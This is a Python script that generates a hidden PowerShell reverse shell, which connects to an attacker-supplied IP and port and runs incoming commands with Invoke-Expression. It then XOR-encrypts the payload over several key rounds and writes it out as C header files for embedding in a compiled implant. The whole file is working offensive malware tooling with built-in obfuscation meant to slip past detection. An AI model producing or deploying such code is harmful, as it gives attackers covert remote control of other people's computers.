import random
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--rounds', type=int, required=True)
parser.add_argument('-k', '--keylen', type=int, required=True)
args = parser.parse_args()

ROUNDS = args.rounds
KEY_LEN = args.keylen

# Placeholders must be unique and fixed-length
IP_PLACEHOLDER = "__IP__"
PORT_PLACEHOLDER = "__PORT__"

def build_payload():
    return f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command " \
$client = New-Object System.Net.Sockets.TCPClient('{IP_PLACEHOLDER}',{PORT_PLACEHOLDER}); \
$stream = $client.GetStream(); \
$writer = New-Object System.IO.StreamWriter($stream); \
$reader = New-Object System.IO.StreamReader($stream); \
$writer.AutoFlush = $true; \
while ($true) {{ \
    $writer.Write('PS ' + (Get-Location).Path + '> '); \
    $input = $reader.ReadLine(); \
    if ($input -eq 'exit') {{ break }}; \
    try {{ \
        $output = Invoke-Expression $input 2>&1 | Out-String; \
        $writer.WriteLine($output); \
    }} catch {{ \
        $writer.WriteLine('Error: ' + $_); \
    }} \
}} \
$client.Close();"'''

payload = build_payload()
url_bytes = bytearray(payload.encode('utf-8'))
URL_LEN = len(url_bytes)

def generate_key(seed):
    random.seed(seed * 12345)
    return bytearray((random.randint(0, 255)) for _ in range(KEY_LEN))

keys = []
for i in range(ROUNDS):
    key = generate_key(i)
    keys.append(key)
    for j in range(URL_LEN):
        url_bytes[j] ^= key[j % KEY_LEN]

def write_keys(keys, filename="keys.h"):
    with open(filename, "w") as f:
        f.write(f"#define KEY_LEN {KEY_LEN}\n#define ROUNDS {ROUNDS}\n")
        f.write("uint8_t keys[ROUNDS][KEY_LEN] = {\n")
        for key in keys:
            f.write("    { " + ", ".join(f"0x{k:02X}" for k in key) + " },\n")
        f.write("};\n")

def write_encrypted_url(data, filename="encrypted_url.h"):
    with open(filename, "w") as f:
        f.write(f"#define URL_LEN {len(data)}\n")
        f.write("uint8_t encrypted_url[URL_LEN] = {\n    ")
        f.write(", ".join(f"0x{b:02X}" for b in data))
        f.write("\n};\n")

write_keys(keys)
write_encrypted_url(url_bytes)
print("Generated keys.h and encrypted_url.h")
